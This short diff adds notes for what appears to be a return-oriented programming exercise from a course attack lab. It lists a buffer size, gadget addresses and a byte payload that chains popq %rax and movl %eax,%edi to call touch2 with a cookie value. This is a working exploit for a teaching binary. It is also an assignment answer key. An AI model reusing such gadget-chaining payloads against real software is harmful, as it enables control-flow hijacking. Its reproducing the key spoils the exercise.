@@ -1,0 +1,21 @@
+BUFSIZE = 0x38
+touch2 at 0x401c79
+current:
+    rax = 1
+    rdi = 00007fff f7e038e0
+GOAL: %edi <- 0x1d6f8fa5, call touch2
+
+--- PAD ---
+22 1f 40 00 00 00 00 00 # -> popq %rax...
+a5 8f 6f 1d 00 00 00 00 # ...as 0x1d6f8fa5
+f6 1e 40 00 00 00 00 00 # -> movl %eax, %edi
+79 1c 40 00 00 00 00 00 # -> touch2
+
+
+
+401ef6:
+    movl %eax, %edi
+    ret
+
+401f22:
+    popq %rax
